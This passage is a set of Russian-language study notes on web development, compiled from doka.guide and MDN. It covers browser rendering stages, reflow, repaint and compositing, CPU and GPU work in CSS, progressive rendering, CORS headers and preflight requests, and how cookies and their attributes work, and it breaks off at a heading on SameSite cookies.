
##### Критические этапы рендеринга

https://doka.guide/tools/how-the-browser-creates-pages/

https://developer.mozilla.org/ru/docs/Web/Performance/Guides/Critical_rendering_path

Чтобы нарисовать на экране результат работы нашего кода, браузеру нужно выполнить несколько этапов:

1. Сперва ему нужно скачать исходники.
2. Затем их нужно прочитать и _распарсить_.
3. После этого браузер приступает к _рендерингу_ — отрисовке.

###### Получение ресурсов, Fetching

Ресурсы браузер получает с помощью запросов к серверу. В ответ он может получить как, например, данные в виде [JSON](https://doka.guide/tools/json/), так и картинки, видео, файлы стилей и скриптов.

Самый первый запрос к серверу — обычно запрос на получение HTML-страницы (чаще всего `index.html`).
###### Парсинг, Parsing

По мере того как скачивается HTML-страница, браузер пытается её «прочитать» — распарсить.
###### DOM

Браузер работает не с текстом разметки, а с абстракциями над ним. Одна из таких абстракций, результат парсинга HTML-кода, называется [DOM](https://doka.guide/js/dom/).

_DOM (Document Object Model)_ — абстрактное представление HTML-документа, с помощью которого браузер может получать доступ к его элементам, изменять его структуру и оформление.

DOM — это дерево. Корень этого дерева — это элемент HTML, все остальные элементы — это дочерние узлы.

Для такого документа:

```html
<html>
  <head>
    <meta charset="utf-8">
    <title>Hello</title>
  </head>
  <body>
    <p class="text">Hello world</p>
    <img src="/hello.jpg" alt="Привет!">
  </body>
</html>

```

...получится такое дерево:

![DOM дерево](https://doka.guide/tools/how-the-browser-creates-pages/images/DOM-300w.png)

Пока браузер парсит документ и строит DOM, он натыкается на элементы типа [`<img>`](https://doka.guide/html/img/), [`<link>`](https://doka.guide/html/link/), [`<script>`](https://doka.guide/html/script/), которые содержат ссылки на другие ресурсы.

Если ресурс _неблокирующий_ (например, изображение), браузер запрашивает его параллельно с парсингом оставшейся части документа. _Блокирующие_ ресурсы (например, скрипты) приостанавливают обработку до своей полной загрузки.

###### CSSOM

Когда браузер находит элемент `<link>`, который указывает на файл стилей, браузер скачивает и парсит его. Результат парсинга CSS-кода — CSSOM.

_CSSOM (CSS Object Model)_ — по аналогии с DOM, представление стилевых правил в виде дерева.

Для документа выше с такими стилями:

```css

body {
  font-size: 1.5rem;
}

.text {
  color: red;
}

img {
  max-width: 100%;
}

```

...получим такое дерево:

![CSSOM дерево](https://doka.guide/tools/how-the-browser-creates-pages/images/CSSOM-300w.png)

Чтение стилей приостанавливает чтение кода страницы. Поэтому рекомендуется в самом начале отдавать только критичные стили — которые есть на всех страницах и конкретно на этой. Так мы уменьшаем время ожидания, пока «страница загрузится».

Благодаря оптимизациям (например, сканеру предзагрузки) стили могут не блокировать чтение HTML, но они точно блокируют выполнение JavaScript, потому что в JS могут использоваться CSS-селекторы для выборки элементов.

###### Render Tree

После того как браузер составил DOM и CSSOM, он объединяет их в общее _дерево рендеринга_ — Render Tree.

Render Tree — это термин, который используется движком WebKit, в других движках он может отличаться. Например, Gecko использует термин Frame Tree.

В итоге для нашего документа выше мы получим такое дерево:

![Render tree](https://doka.guide/tools/how-the-browser-creates-pages/images/render-tree-300w.png)

Обратите внимание, что в Render tree попадают только видимые элементы. Если бы у нас был элемент, спрятанный через [`display: none`](https://doka.guide/css/display/), он бы в это дерево не попал. Об этом подробнее мы ещё поговорим дальше.

Общая схема парсинга выглядит вот так:

![Общая схема парсинга HTML и CSS](https://doka.guide/tools/how-the-browser-creates-pages/images/1-300w.png)

На первых шагах мы разбираемся с HTML и CSS, а затем объединяем их в Render Tree.

###### Вычисление позиции и размеров, Layout

После того как у браузера появилось дерево рендеринга (Render Tree), он начинает «расставлять» элементы на странице. Этот процесс называется _Layout_.

Чтобы понимать, где какой элемент должен находиться и как он влияет на расположение других элементов, браузер рассчитывает размеры и положение каждого _рекурсивно_.

Расчёт начинается от корневого элемента дерева рендеринга, его размеры равны размеру вьюпорта. Далее браузер переходит поочерёдно к каждому из дочерних элементов.

Важно помнить, что Layout построен на поточной модели компоновки. Это значит, что если элементы не влияют на расположение и размеры других элементов, то их положение и размеры можно просчитать за один подход.

Именно поэтому при вёрстке макетов рекомендуется «находиться в потоке» — чтобы браузеру не приходилось несколько раз пересчитывать один и тот же элемент, так страница отрисовывается быстрее.

###### Глобальный и инкрементальный Layout

_Глобальный Layout_ — это процесс просчёта всего дерева полностью, то есть каждого элемента. _Инкрементальный_ — просчитывает только часть.

Глобальный Layout запускается, например, при изменении размера окна, потому что браузеру требуется подогнать всю страницу под новый размер экрана. Это **очень** дорогой процесс.

Инкрементальный Layout запускает пересчёт только «грязных» элементов.

###### «Грязные» элементы

Это те элементы, которые были изменены, и их дочерние элементы.

Если мы как-то поменяли блок, то браузер перерисует его и его детей, потому что их положение и размеры могут зависеть от родителя.

![Дерево «грязных» и перерисованных элементов](https://doka.guide/tools/how-the-browser-creates-pages/images/2-300w.png)

Дальше браузер приступает к, собственно, отрисовке.

###### Непосредственно отрисовка, Paint

Во время отрисовки (Paint) браузер наполняет пиксели на экране нужными цветами в зависимости от того, что в конкретном месте должно быть нарисовано: текст, изображение, цвет фона, тени, рамки и т. д.

Отрисовка тоже бывает _глобальной_ и _инкрементальной_. Чтобы понять, какую часть вьюпорта надо перерисовать, браузер делит весь вьюпорт на прямоугольные участки. Логика тут та же, как и в Layout — если изменения ограничены одним участком, то пометится «грязным» и перерисуется лишь он.

Отрисовка — это _самый_ дорогой процесс из всех, что мы уже перечислили.

###### Порядок отрисовки

Порядок отрисовки связан со стековым контекстом.

В общих чертах, отрисовка начинается с заднего плана и постепенно переходит к переднему:

- `background-color`;
- `background-image`;
- `border`;
- `children`;
- `outline`.

###### CPU и композитинг

И Layout, и Paint работают за счёт _CPU (central process unit)_, поэтому относительно медленные. Плавные анимации при таком раскладе невероятно дорогие.

Для плавных анимаций в браузерах предусмотрен композитинг (Compositing).

_Композитинг_ — это разделение содержимого страницы на «слои», которые браузер будет перерисовывать. Эти слои друг от друга не зависят, из-за чего изменение элемента в одном слое не затрагивает элементы из других слоёв, и перерисовывать их становится не нужно.

Именно из-за разнесения элементов по разным композиционным слоям свойство `transform` не так сильно нагружает браузер. Поэтому чтобы анимации не тормозили, их рекомендуется делать с применением `transform` и `opacity`.

![Схема композитинга](https://doka.guide/tools/how-the-browser-creates-pages/images/3-300w.png)

Применение таких свойств, как, например, `transform`, «выносит» элемент на отдельный композитный слой, где положение элемента не зависит от других и не влияет на них.

Чтобы узнать, вызывает ли конкретное CSS-свойство композитинг и перерисовку в браузере, воспользуйтесь инструментом «[CSS Triggers](https://csstriggers.com/)».

###### Перерисовка, Reflow (relayout) и Repaint

Процесс отрисовки — циклический. Браузер перерисовывает экран каждый раз, когда на странице происходят какие-то изменения.

Если, например, в DOM-дереве добавился новый узел, или изменился текст, то браузер построит новое дерево рендеринга и запустит вычисление позиции и отрисовку заново.

Один цикл обновления — это animation frame.

Зная «расписание отрисовки» браузера, мы можем «предупредить» его, что хотим запустить какую-то анимацию на каждый новый фрейм. Это можно сделать с помощью `requestAnimationFrame()`.

```js

const animate = () => { 
	// Код анимации 
}

```

Эта функция запускает новый кадр анимации: обновляет какое-то свойство или перерисовывает canvas.

Если мы хотим добиться плавной анимации, используя функцию выше, мы должны обеспечить в среднем 60 обновлений экрана за секунду (60 fps — frames per second).

Это можно сделать топорно, через интервал:

```js
// 60 раз в 1000 миллисекунд, приблизительно 16 мс.
const intervalMS = 1000 / 60
setInterval(animate, intervalMS)

```

Либо использовать `window.requestAnimationFrame()`:

```js

window.requestAnimationFrame(animate)

```

Интервалы не всегда запускаются в нужный момент. [`setInterval()`](https://doka.guide/js/setinterval/) не учитывает, на какой стадии отрисовки находится страница, и в итоге кадры отрисовки могут быть рваными или дёрганными.

С интервалом анимация может быть рваной, потому что перерисовка может быть запущена в неподходящее время.

А если вкладка была неактивна, то интервал может «попытаться догнать время», и несколько кадров запустятся разом:

![Анимация с setInterval](https://doka.guide/tools/how-the-browser-creates-pages/images/reflow-300w.png)

С `requestAnimationFrame()` анимация плавнее, потому что браузер знает, что в следующем фрейме надо запустить новый кадр анимации.

Она не гарантирует, что анимация будет запущена строго раз в 16 мс, но значение будет достаточно близким.

![Анимация с requestAnimationFrame](https://doka.guide/tools/how-the-browser-creates-pages/images/reflow-2-300w.png)

Для динамики всегда используйте [`transform`](https://doka.guide/css/transform/) и [`opacity`](https://doka.guide/css/opacity/), избегайте изменения остальных свойств (типа `left`, `top`, [`margin`](https://doka.guide/css/margin/), [`background`](https://doka.guide/css/background/) и так далее).

Таким образом вы дадите браузеру возможность оптимизировать отрисовку, отчего страница станет отзывчивее.

Для анимаций, которые необходимо перерисовывать на каждый фрейм, используйте `requestAnimationFrame()`.

Это сделает тяжёлую анимацию менее рваной.

##### Что такое прогрессивный рендеринг (progressive rendering)?

Чтобы понять что такое progressive rendering, нужно понимать отличие _client-side rendering_ от _server-side rendering_.

При **client-side rendering** (CSR) контент отрисовывается на стороне клиента (в браузере). Такой подход используется в React, когда браузеру отсылается практически пустой HTML-документ, а потом запускается скрипт, который генерирует HTML в указанном скрипту теге. Как правило это `<div id="root">`. Пользователь будет видеть пустую страницу, пока JS-файл полностью не загрузится.

При **server-side rendering** (SSR) HTML-разметка генерируется на сервере, отсылается браузеру и после этого отрисовывается на клиенте. Пользователь увидит контент сразу же, но не сможет взаимодействовать со страницей, пока не загрузится JS-файл.

При использовании прогрессивного рендеринга, кусочки HTML генерируется на сервере и отсылаются браузеру в порядке их приоритетности. То есть, элементы с самым высоким приоритетом (например `<header>`, фон, главная интерактивная часть страницы) генерируются на сервере, отсылаются браузеру и отрисовываются в первую очередь. Это позволяет пользователю увидеть самый важный контент как можно скорее, не дожидаясь полной загрузки всего контента. То есть, progressive rendering что-то среднее между client-side rendering и server-side rendering.

Техники реализации прогрессивного рендеринга:

1. **Ленивая загрузка** (Lazy Loading). Загрузка контента по мере необходимости. Например, если страница достаточно большая, не нужно загружать изображения вне вьюпорта. Загрузка изображения стартует за некоторое время до того как она появится во вьюпорте. Эту же технику можно использовать для загрузки контента изначально скрытых элементов. Например, можно загрузить контент закрытого меню когда пользователь наводит курсор на кнопку открытия.
2. **Приоритизация контента**. Например, не загружать изначально все CSS-стили. Добавлять в `<head>` загрузку только тех стилей, которые нужны для текущей видимой области HTML-документа. Остальные стили можно добавить в `<body>`.

##### **Reflow, Repaint, и Compose в браузере: как работает рендеринг**  

Когда браузер отображает веб-страницу, он проходит несколько этапов обработки HTML, CSS и JavaScript. **Reflow (перерасчёт макета), Repaint (перерисовка) и Compose (композиция)** — это ключевые процессы, влияющие на производительность.

---

###### **1. Reflow (Layout)**
**Что это?**  
Перерасчёт **размеров и позиций** элементов DOM. Происходит, когда:  
- Изменяются геометрические свойства (`width`, `height`, `margin`, `position` и т. д.).  
- Добавляются/удаляются элементы из DOM.  
- Изменяется размер окна браузера.  

**Примеры триггеров:**  
```js
element.style.width = '100px'; // Рефлоу
element.classList.add('new-class'); // Если класс меняет размеры/позицию
window.addEventListener('resize', callback); // Рефлоу при изменении окна
```

**Почему это дорого?**  
Браузер пересчитывает макет **всего документа** или его части (в лучшем случае).

---

###### **2. Repaint (Rasterize)**
**Что это?**  
Перерисовка **пикселей** без изменения макета. Происходит при:  
- Изменении визуальных свойств (`color`, `background`, `visibility`, `opacity`).  
- После Reflow (т. к. меняется геометрия).  

**Примеры триггеров:**  
```js
element.style.color = 'red'; // Только репаинт
element.style.opacity = '0.5'; // Репаинт (но современные браузеры могут оптимизировать через Compose)
```

**Почему это дешевле Reflow?**  
Не требует пересчёта макета, но всё равно затратно на больших страницах.

---

###### **3. Compose (Composite)**
**Что это?**  
Отдельный этап рендеринга, когда браузер **комбинирует готовые слои** (layers) в итоговое изображение.  

**Оптимизированные свойства (только Compose, без Reflow/Repaint):**  
- `transform` (`translate`, `scale`, `rotate`)  
- `opacity`  
- `filter` (в некоторых браузерах)  
- `will-change: transform` (подсказка браузеру создать отдельный слой)  

**Пример:**  
```js
element.style.transform = 'translateX(10px)'; // Только композиция
```

**Почему это быстро?**  
Браузер использует **GPU** и не трогает основной поток рендеринга.

---

###### **Как оптимизировать?**  
1. **Избегайте частых Reflow**:  
   - Группируйте изменения DOM через `documentFragment` или `requestAnimationFrame`.  
   - Используйте `flexbox/grid` вместо `float` (меньше перерасчётов).  

2. **Снижайте количество Repaint**:  
   - Применяйте `transform/opacity` вместо `top/left`.  
   - Используйте `will-change` для сложных анимаций.  

3. **Пользуйтесь Compose**:  
   - Анимируйте через `transform` и `opacity`.  

---

###### **Источники**  
1. [Google Developers: Rendering Performance](https://developers.google.com/web/fundamentals/performance/rendering)  
2. [MDN: Critical Rendering Path](https://developer.mozilla.org/en-US/docs/Web/Performance/Critical_rendering_path)  
3. [CSS Triggers](https://csstriggers.com/) (таблица свойств и их влияния на Reflow/Repaint)  

--- 

**Итог:**  
- **Reflow** = Перерасчёт макета → Самый дорогой.  
- **Repaint** = Перерисовка → Дешевле, но тоже затратно.  
- **Compose** = GPU-ускорение → Оптимально для анимаций.  

Оптимизируя эти этапы, можно значительно ускорить рендеринг страницы.
##### что вычисляется на процессоре а что на gpu в css?
В CSS практически все вычисления выполняются на **CPU**, а не на GPU. Однако есть определённые свойства и операции, которые могут **передаваться на GPU** для ускорения рендеринга.  

###### **Что обрабатывается на CPU?**  
Большинство вычислений в CSS выполняется на CPU, включая:  
- **Разметку (Layout / Reflow)** – вычисление размеров и позиций элементов (`width`, `height`, `margin`, `padding`, `position` и т. д.).  
- **Стилизацию (Style Calculation)** – применение CSS-правил (`color`, `font-size`, `background` и др.).  
- **Обработку сложных селекторов** (например, вложенные `:hover`, `:nth-child()`).  

###### **Что может обрабатываться на GPU?**  
Некоторые CSS-свойства могут **использовать GPU-ускорение** (через аппаратное ускорение), что улучшает производительность:  
1. **3D-трансформации** (`transform: translate3d()`, `rotate3d()`, `scale3d()`).  
2. **Анимации и переходы** (`transition`, `animation`) с `transform` или `opacity`.  
3. **Фильтры** (`filter: blur()`, `drop-shadow()`).  
4. **Наложения** (`will-change: transform, opacity`).  
5. **Видео и Canvas** (рендеринг `<video>` и `<canvas>` может использовать GPU).  

###### **Как задействовать GPU?**  
Чтобы браузер использовал GPU, можно применить:  
```css
.element {
    transform: translateZ(0); /* или translate3d(0, 0, 0) */
    will-change: transform;   /* подсказка браузеру */
}
```  
Это перемещает элемент в отдельный **GPU-слой (composition layer)**, что ускоряет анимации.  

###### **Вывод**  
- **CPU:** Основные вычисления (разметка, стилизация).  
- **GPU:** Отдельные оптимизированные операции (анимации, трансформации, фильтры).  

Если нужно ускорить анимации, лучше использовать `transform` и `opacity`, а не свойства, вызывающие перерасчёт разметки (например, `width` или `margin`).

##### CORS
http://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
https://habr.com/ru/companies/macloud/articles/553826/
https://doka.guide/tools/cors/

_CORS_ расшифровывается как _Cross-Origin Resource Sharing_. Это механизм браузера, который позволяет определить список ресурсов, к которым страница может получить доступ. Он нужен для обеспечения безопасности и защиты пользователей от злоумышленников при использовании [HTTP-протокола](https://doka.guide/tools/http-protocol/).

По умолчанию сайты могут запрашивать ресурсы только со своего `origin`. Такое ограничение называется _Same-Origin Policy_. CORS расширяет Same-Origin Policy, позволяя получать доступ к ресурсам с разных доменов.

`origin` – это комбинация протокола, домена и порта (если он указан). Например, `doka.guide` – это домен, а `https://doka.guide` – `origin`.

Настройка доступа должна происходить как со стороны браузера, так и со стороны сервера. Это означает, что и браузер, и сервер должны быть настроены на разрешение или запрет доступа к ресурсам с других `origin`.

> Пользователь открывает страницу сайта `doka.guide`. Страница отправляет запрос к стороннему источнику `api.example.com`.  
> Браузер сравнивает `origin` и понимает, что `api.example.com` – сторонний `origin` для нашего сайта, из-за чего блокирует запрос. Причём запрос может быть заблокирован в рамках одного домена, например, `origin` будет отличаться у `http://doka.guide` и `https://doka.guide` из-за несовпадения протоколов.

Такие запросы с сайта на сайт называются _перекрёстными_.
Для настройки CORS со стороны сервера используются специальные заголовки запроса:

- `Access-Control-Allow-Origin` – указывает на `origin`, откуда на сервер разрешены запросы.
- `Access-Control-Allow-Methods` – указывает, какие [HTTP-методы](https://doka.guide/tools/http-protocol/#startovaya-stroka) разрешены для запросов на сервер. Например, `GET`, `POST`, `DELETE`.
- `Access-Control-Allow-Headers` – определяет, какие заголовки могут быть использованы в ответе от сервера, которые не являются стандартными для [HTTP](https://doka.guide/tools/http-protocol/).
- `Access-Control-Allow-Credentials` – указывает, разрешено ли отправлять [cookie](https://doka.guide/js/cookie/) и авторизационные данные вместе с запросом на сервер. Для разрешения используется значение `true`.
- `Access-Control-Max-Age` – определяет максимальное время, в течение которого должны кэшироваться предыдущие ответы на запросы предварительной проверки CORS.
- `Access-Control-Expose-Headers` – определяет список заголовков, которые могут быть доступны на клиентской стороне.

Также есть заголовок для настройки со стороны браузера: `Origin` указывает на комбинацию домена, порта и протокола, откуда на сервер поступает запрос. А вот заголовки для настройки предварительных запросов:

- `Access-Control-Request-Method` – определяет метод запроса, который будет использоваться в основном запросе;
- `Access-Control-Request-Headers` – используется для указания заголовков, которые будут использоваться в основном запросе.

###### Предварительные запросы

Предварительный запрос – это дополнительный HTTP-запрос, который отправляется браузером перед основным запросом.

Когда страница запрашивает данные с другого `origin`, браузер отправляет предварительный запрос `OPTIONS` на сервер, чтобы узнать, разрешены ли такие запросы. При повторном запросе на тот же `origin`, запрос `OPTIONS` может и не отправляться, а все данные получаться из кэша.

При отправке запроса на `api.example.com`, браузер проставит заголовок `Origin`, сформирует запрос в [определённом формате](https://doka.guide/tools/http-protocol/#format-soobshcheniya) и отправит его на сервер:

```

OPTIONS / HTTP/1.1
Host: api.example.com
Origin: https://doka.guide

```

Если сервер запрещает доступ к ресурсу, то в результате запроса в браузере мы увидим ошибку. А если доступ разрешён, то сервер ответит на запрос заголовком:
```
Access-Control-Allow-Origin: https://doka.guide

```

Такая запись означает, что сервер разрешает доступ с домена `doka.guide`, при этом только по протоколу `https`.

Сервер может разрешить только один конкретный `Origin`, нельзя указать несколько. Если доступ необходим сразу с нескольких доменов, то сервер должен проверить, что `Origin` из запроса клиента разрешён и динамически подставить этот `Origin` в ответ. А ещё добавить заголовок `Vary: Origin`, чтобы браузер понимал, что ответ сервера зависит от источника запроса, и корректно обрабатывал такие ответы.

```

Access-Control-Allow-Origin: https://doka.guide
Vary: Origin

```

При желании можно давать доступ сразу всем:

```

Access-Control-Allow-Origin: *

```

Лучше избегать разрешения доступа с любого домена (`*`): это повышает уязвимость вашего сервера к [атакам](https://doka.guide/tools/web-security/), например, к CSRF.

CSRF расшифровывается как _cross-site request forgery_ или _межсайтовая подделка запроса_. Это вид атаки, когда злоумышленник получает доступ к данным из браузера другого человека и выполняет действия от его лица. Например, изменяет пароль от личного кабинета на сайте, где уже авторизован этот пользователь.


##### cookie
https://doka.guide/js/cookie/
https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies

При разработке сайтов часть информации (например, токен авторизации или данные пользователя) нужно хранить и читать как в браузере, так и на сервере. Для этого используют **Cookie** (произносится «куки»).

Куки передаются в виде HTTP-заголовка, это накладывает на них ограничения. Например, максимальный размер куки в 4096 байт или отсутствие в содержимом пробелов или запятых. Чтобы обезопасить содержимое, можно закодировать его с помощью функции `encodeURIComponent()`.

Все куки хранятся в свойстве `document.cookie`. Это свойство представляет собой [строку](https://doka.guide/js/string/) в формате `имя=значение`, где пары имён и значений разделяются знаком `;` . При этом взаимодействие с полем весьма необычное — если присвоить `document.cookie` новое значение, то оно не заменит полностью старую строку, а добавит или изменит значение по ключу.

Запись в cookie работает с помощью присвоения значения новой куки в поле `document.cookie`. За один раз можно записать лишь одно значение.

Вот так можно добавить значение 1 по ключу _counter_:

```js

document.cookie = 'counter=1'
console.log(document.cookie)
// 'counter=1'

```

При присвоении свойству куки с другим именем, получим два записанных значения:

```js

document.cookie = 'sidebar=false'
console.log(document.cookie)
// 'counter=1; sidebar=false;'

```

При повторной записи в то же поле другого значения оно будет перезаписано.

```js

document.cookie = 'sidebar=true'
console.log(document.cookie)
// -> 'counter=1; sidebar=true;'

```

При установке кук можно указывать не только её название и значение, но и другие параметры. Все они являются необязательными и разделяются точкой с запятой `;`.

- `path` — определяет путь, по которому будет доступна кука. Он должен быть абсолютным, то есть начинаться с `/`. Если параметр не передан, то кука будет доступна на всех страницах сайта.
- `domain` — определяет домен, для которого указана кука. Если не указано, то будет использоваться текущий домен.
- `max-age` и `expires` — определяет время жизни куки.`max-age` указывает, через сколько секунд, а `expires` указывает точное время, когда кука станет недействительна. Время для `expires` можно отформатировать с помощью встроенного метода даты `Date.toUTCString()`
- `secure` — указывает, что данная кука может быть передана только при запросах по защищённому протоколу HTTPS.
- `samesite` — определяет, может ли данная кука быть отправлена при кроссдоменном запросе. Значение параметра `strict` будет предотвращать отправку на другие домены, а `lax` разрешит отправлять куки с GET-запросами.

Есть пара ограничений при специфичных названиях кук. Если название куки начинается с `__Secure-`, то обязательно должен быть передан параметр `secure`. При этом мы должны находиться на странице, которая была получена по HTTPS-протоколу. Если название куки начинается с `__Host-`, то обязательно должны быть переданы параметры `path=/` и `secure` (страница также должна быть открыта по HTTPS-протоколу), а атрибут `domain` должен отсутствовать для снижения кроссдоменных уязвимостей.

Запись куки с разрешением передавать её только по HTTPS и только для текущего домена, со временем жизни в 1 час будет выглядеть так:

```js

document.cookie = 'sidebar=true;secure;samesite=strict;max-age=3600'

```

![Все возможные параметры установки куки](https://doka.guide/js/cookie/images/cookie-scheme-300w.png)

Для установки куки, которая будет доступна на текущем домене и всех его поддоменах, используйте название текущего домена и поставьте точку в начале — `.${window.location.hostname}`.

Для получения значений, записанных в куки, можно просто вывести содержимое `document.cookie`:

```js

console.log(document.cookie)

```

Учитывая, что мы уже дважды записывали куки, при вызове команды выше в консоли выведется `counter=1; sidebar=true;`.

Чтобы получить значение конкретной куки, нам нужно будет прочитать строки и разобрать её по значениям. Например, так:

```js

function getCookie() {
  return document.cookie.split('; ').reduce((acc, item) => {
    const [name, value] = item.split('=')
    acc[name] = value
    return acc
  }, {})
}

const cookie = getCookie()

console.log(cookie.counter)
// 1
console.log(cookie.sidebar)
// true

```

Для кук не предусмотрено специального метода удаления, поэтому для этого используется трюк с установкой кук с параметром `expires` который указывает на дату в прошлом. Браузер сразу же считает такую куку устаревшей и удаляет её:

```js

document.cookie = `sidebar=;expires=${new Date(0)}`

```

В этом примере, передав число 0 в конструктор `Date` мы получаем время на начало [эпохи Unix](https://ru.wikipedia.org/wiki/Unix-%D0%B2%D1%80%D0%B5%D0%BC%D1%8F), а именно 1 января 1970 года. Поскольку эта дата из прошлого, то кука будет удалена моментально.

Есть куки, которые нельзя прочитать или записать из JavaScript. Если сервер устанавливает куки с параметром `HttpOnly` (доступен только для установки сервером), то такие куки будут недоступны в `document.cookie`. Как правило, такие куки используются для хранения чувствительной информации, как, например, токены для авторизации. Проверка авторизации происходит с помощью запроса с текущим авторизованным пользователем и считается при успешном ответе сервера.

Формат строки `document.cookie` не очень удобен для работы, поэтому обычно в проекте создают функции, которые упрощают чтение и запись кук. Чтобы не писать эти функции самостоятельно, можно взять библиотеку [js-cookie](https://github.com/js-cookie/js-cookie). Это небольшая обёртка над стандартным браузерным API, которая здорово упрощает жизнь.

С этой библиотекой установка значения для куки выполняется так:

```js

import Cookies from "js-cookie"

Cookies.set("foo", "bar")

```

А чтение так:

```js

import Cookies from "js-cookie"

const nameFromCookie = Cookies.get("name")

```

#####  HTTP-куки

HTTP cookie (web cookie, куки браузера) - это небольшой фрагмент данных, который сервер отправляет браузеру пользователя. Браузер может сохранить этот фрагмент у себя и отправлять на сервер с каждым последующим запросом. Это, в частности, позволяет узнать, с одного ли браузера пришли несколько запросов (например, для аутентификации пользователя). С помощью кук можно сохранить любую информацию о состоянии, HTTP-протокол сам по себе этого делать не умеет.
Куки часто используются для:

- Управления сеансом (логины, корзины для виртуальных покупок)
- Персонализации (пользовательские предпочтения)
- Трекинга (отслеживания поведения пользователей)

До недавнего времени куки использовались в качестве хранилища информации на стороне пользователя. Это могло иметь смысл в отсутствии вариантов, но теперь, когда в распоряжении браузеров появились различные API для хранения данных, это уже не так. Из-за того что куки пересылаются с каждым запросом, они могут ухудшать производительность (особенно при использовании мобильных сетей). В качестве хранилищ данных на стороне пользователя вместо них можно использовать [Web storage API](https://developer.mozilla.org/ru/docs/Web/API/Web_Storage_API) (`localStorage` и `sessionStorage`) и [IndexedDB](https://developer.mozilla.org/ru/docs/Web/API/IndexedDB_API).
###### [Создание куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5_%D0%BA%D1%83%D0%BA%D0%B8)

Получив HTTP-запрос, вместе с ответом сервер может отправить заголовок [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie). Куки обычно запоминаются браузером и посылаются в HTTP-заголовке [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie) с каждым новым запросом к одному и тому же серверу. Можно задать срок действия кук, а также срок их жизни, после которого куки не будут отправляться. Также можно указать ограничения на путь и домен, то есть указать, в течении какого времени и к какому сайту они будут отсылаться.

Заголовок [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) HTTP-ответа используется для отправки куки с сервера в клиентское приложение (браузер). Простой куки может задаваться так:

```

Set-Cookie: <имя-куки>=<заголовок-куки>

```

Этот заголовок с сервера даёт клиенту указание сохранить куки (это делают, например, [PHP](http://php.net/manual/en/function.setcookie.php), [Node.js](https://nodejs.org/dist/latest-v6.x/docs/api/http.html#http_response_setheader_name_value), [Python](https://docs.python.org/3/library/http.cookies.html) и [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)). Ответ, отправляемый браузеру, содержит заголовок `Set-Cookie`, и куки запоминается браузером.

```

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Теперь с каждым новым запросом к серверу при помощи заголовка [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie) браузер будет возвращать серверу все сохранённые ранее куки.

```

GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

```

###### [Сессионные cookie](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B5_cookie)

Простой cookie, пример которого приведён выше, представляет собой сессионный _cookie_ (_session cookie_) - такие cookie удаляются при закрытии клиента, то есть существуют только на протяжении текущего сеанса, поскольку атрибуты `Expires` или `Max-Age` для него не задаются. Однако, если в браузере включено автоматическое восстановление сеанса, что случается очень часто, cookie сеанса может храниться постоянно, как если бы браузер никогда не закрывался.

###### [Постоянные cookies](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BF%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%BD%D1%8B%D0%B5_cookies)

_Постоянные cookie_ (_permanent cookies_) удаляются не с закрытием клиента, а при наступлении определённой даты (атрибут `Expires`) или после определённого интервала времени (атрибут `Max-Age`).

```

Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

```

###### [`Secure` ("безопасные") и `HttpOnly` куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#secure_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D1%8B%D0%B5_%D0%B8_httponly_%D0%BA%D1%83%D0%BA%D0%B8)

"Безопасные" (secure) куки отсылаются на сервер только тогда, когда запрос отправляется по протоколу SSL и HTTPS. Однако важные данные никогда не следует передавать или хранить в куках, поскольку сам их механизм весьма уязвим в отношении безопасности, а флаг `secure` никакого дополнительного шифрования или средств защиты не обеспечивает. Начиная с Chrome 52 и Firefox 52, незащищённые сайты (http:) не могут создавать куки с флагом `Secure`.

Куки HTTPonly не доступны из JavaScript через свойства [`Document.cookie`](https://developer.mozilla.org/ru/docs/Web/API/Document/cookie) API, что помогает избежать межсайтового скриптинга ([XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS)). Устанавливайте этот флаг для тех кук, к которым не требуется обращаться через JavaScript. В частности, если куки используются только для поддержки сеанса, то в JavaScript они не нужны, так что в этом случае следует устанавливать флаг `HttpOnly`.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

###### [Область видимости куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C_%D0%B2%D0%B8%D0%B4%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8_%D0%BA%D1%83%D0%BA%D0%B8)

Директивы `Domain` и `Path` определяют область видимости куки, то есть те URL-адреса, к которым куки будут отсылаться.

###### Атрибут Domain

Атрибут `Domain` указывает хосты, на которые отсылаются куки. Если он не задан, то по умолчанию берётся доменная часть адреса документа (но без поддоменов). Если домен указан явно, то поддомены всегда включены.

Например, если задано `Domain=mozilla.org`, то куки включены и в поддоменах, например, в `developer.mozilla.org`.

###### Атрибут Path

Атрибут `Path` указывает URL, который должен быть в запрашиваемом ресурсе на момент отправки заголовка `Cookie`. Символ %x2F ("/") интерпретируется как разделитель в URL-пути, подпути также будут учитываться.

Если задан `Path=/docs`, то совпадать будут следующие пути:

- `/docs`
- `/docs/`
- `/docs/Web/`
- `/docs/Web/HTTP`

А эти пути совпадать не будут:

- `/`
- `/docsets`
- `/fr/docs`

###### Куки `SameSite`

